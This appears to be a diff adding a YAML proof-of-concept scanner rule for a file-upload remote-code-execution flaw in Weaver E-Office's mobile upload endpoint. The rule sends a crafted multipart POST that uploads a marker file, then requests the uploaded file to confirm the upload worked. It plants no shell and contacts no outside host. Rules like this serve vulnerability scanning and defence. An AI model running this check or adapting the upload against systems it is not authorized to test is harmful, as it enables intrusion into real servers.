@@ -1,0 +1,23 @@
+name: poc-yaml-eoffice-mobile-upload-rce
+rules:
+    - method: POST
+      path: /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save
+      follow_redirects: false
+      headers:
+          Content-Type: multipart/form-data; boundary=---------------------------376008651130158601163945320856
+      body: "\r\n-----------------------------376008651130158601163945320856\r\nContent-Disposition: form-data; name=\"upload_quwan\"; filename=\"1314520.txts\"\r\nContent-Type: image/png\r\n\r\n1314520\r\n-----------------------------376008651130158601163945320856--"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520.txts')
+      search: >-
+        (?P<filen>([0-9]{10}))
+    - method: GET
+      path: /attachment/{{filen}}/1314520.txts
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520')
+        
+detail:
+    author: eoffice-mobile-upload-rce
+    links:
+        - https://www.baidu.com
+        - app="泛微-EOffice"
